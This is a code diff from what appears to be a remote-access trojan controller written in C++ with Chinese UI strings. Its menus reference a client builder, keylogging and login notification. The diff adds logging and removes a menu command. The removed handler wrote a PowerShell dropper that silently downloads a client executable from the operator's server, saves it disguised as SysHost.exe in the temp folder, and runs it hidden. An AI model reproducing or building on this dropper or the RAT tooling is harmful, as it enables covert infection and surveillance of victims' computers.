@@ -45,6 +45,7 @@
 #include "UI/SettingsDialog.h"
 #include "UI/BuilderDialog.h"
 #include "Utils/StringHelper.h"
+#include "Server/Utils/Logger.h"
 
 using namespace Formidable;
 using namespace Formidable::Utils;
@@ -63,7 +64,6 @@ void CreateMainMenu(HWND hWnd) {
     
     // 工具(&T)
     hSubMenu = CreatePopupMenu();
-    AppendMenuW(hSubMenu, MF_STRING, IDM_TOOL_GEN_SHELLCODE, L"ShellCode生成(&G)");
     AppendMenuW(hSubMenu, MF_STRING, IDM_TOOL_RELOAD_PLUGINS, L"刷新插件(&P)");
     AppendMenuW(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, L"工具(&T)");
     
@@ -401,6 +401,10 @@ void AddLog(const std::wstring& type, const std::wstring& msg) {
         st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
         type.c_str(), msg.c_str());
     AppendLogFile(line);
+
+    // Integrate with Phase 4 Logger
+    std::string logMsg = WideToUtf8(type + L": " + msg);
+    Formidable::Server::Utils::Logger::Log(Formidable::Server::Utils::LogLevel::LL_INFO, logMsg);
 }
 
 // ---------------------------------------------------------
@@ -430,7 +434,7 @@ void HandleCommand(HWND hWnd, int id) {
     // 防止重复选择
     int clientId = -1;
     if (id != IDM_SETTINGS && id != IDM_BUILDER && 
-        id != IDM_TOOL_GEN_SHELLCODE && id != IDM_TOOL_RELOAD_PLUGINS &&
+        id != IDM_TOOL_RELOAD_PLUGINS &&
         id != IDM_EXTEND_HISTORY && id != IDM_EXTEND_BACKUP && id != IDM_EXTEND_IMPORT &&
         id != IDM_PARAM_KBLOGGER && id != IDM_PARAM_OFFLINE_KEYLOG &&
         id != IDM_PARAM_LOGIN_NOTIFY && id != IDM_PARAM_ENABLE_LOG) {
@@ -1050,70 +1054,6 @@ void HandleCommand(HWND hWnd, int id) {
     // 主菜单项处理
     case IDM_MENU_SET:
         DialogBoxParamW(g_hInstance, MAKEINTRESOURCEW(IDD_SETTINGS), hWnd, SettingsDlgProc, 0);
-        break;
-    case IDM_TOOL_GEN_SHELLCODE:
-        // Shellcode生成逻辑：生成一个 PowerShell Dropper，可用于快速上线
-        {
-            wchar_t szSavePath[MAX_PATH] = L"Formidable_Dropper.ps1";
-            OPENFILENAMEW ofn = { 0 };
-            ofn.lStructSize = sizeof(ofn);
-            ofn.hwndOwner = hWnd;
-            ofn.lpstrFilter = L"PowerShell 脚本 (*.ps1)\0*.ps1\0所有文件 (*.*)\0*.*\0";
-            ofn.lpstrFile = szSavePath;
-            ofn.nMaxFile = MAX_PATH;
-            ofn.Flags = OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST;
-            ofn.lpstrDefExt = L"ps1";
-            ofn.lpstrTitle = L"生成 PowerShell 投放器 (Dropper)";
-
-            if (GetSaveFileNameW(&ofn)) {
-                // 动态获取 IP：如果有启用 FRP，则使用映射后的公网地址；否则使用本地地址
-                std::wstring ip = L"127.0.0.1";
-                if (g_Settings.bEnableFrp && wcslen(g_Settings.szFrpServer) > 0) {
-                    ip = g_Settings.szFrpServer;
-                } else {
-                    // 尝试获取本机的局域网 IP
-                    char szHostName[255];
-                    if (gethostname(szHostName, 255) == 0) {
-                        struct hostent* host_entry = gethostbyname(szHostName);
-                        if (host_entry != NULL) {
-                            char* localIP = inet_ntoa(*(struct in_addr*)*host_entry->h_addr_list);
-                            ip = Utils::StringHelper::UTF8ToWide(localIP);
-                        }
-                    }
-                }
-                
-                int port = g_Settings.bEnableFrp ? g_Settings.frpDownloadPort : Formidable::DEFAULT_PORT;
-                std::string ipStr = Utils::StringHelper::WideToUTF8(ip);
-
-                std::string psScript = 
-                    "# Formidable 2026 Professional PowerShell Dropper\n"
-                    "$ErrorActionPreference = 'SilentlyContinue'\n"
-                    "$ip = \"" + ipStr + "\"\n"
-                    "$port = " + std::to_string(port) + "\n"
-                    "$url = \"http://$($ip):$($port)/Client.exe\"\n"
-                    "if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { $url = \"http://$($ip):$($port)/Client_x64.exe\" }\n"
-                    "$path = \"$env:TEMP\\SysHost.exe\"\n"
-                    "try {\n"
-                    "    $wc = New-Object System.Net.WebClient\n"
-                    "    $wc.DownloadFile($url, $path)\n"
-                    "    if (Test-Path $path) {\n"
-                    "        Start-Process $path -WindowStyle Hidden\n"
-                    "        Write-Host \"[+] Payload activated.\"\n"
-                    "    }\n"
-                    "} catch {\n"
-                    "    Write-Host \"[-] Failed to load payload.\"\n"
-                    "}\n";
-                
-                HANDLE hFile = CreateFileW(szSavePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
-                if (hFile != INVALID_HANDLE_VALUE) {
-                    DWORD written;
-                    WriteFile(hFile, psScript.data(), (DWORD)psScript.size(), &written, NULL);
-                    CloseHandle(hFile);
-                    AddLog(L"系统", L"已生成 Dropper 到: " + std::wstring(szSavePath));
-                    MessageBoxW(hWnd, L"PowerShell Dropper 已生成!\n你可以将其用于快速投放。", L"生成成功", MB_OK | MB_ICONINFORMATION);
-                }
-            }
-        }
         break;
     case IDM_TOOL_RELOAD_PLUGINS:
         AddLog(L"系统", L"已刷新插件列表");
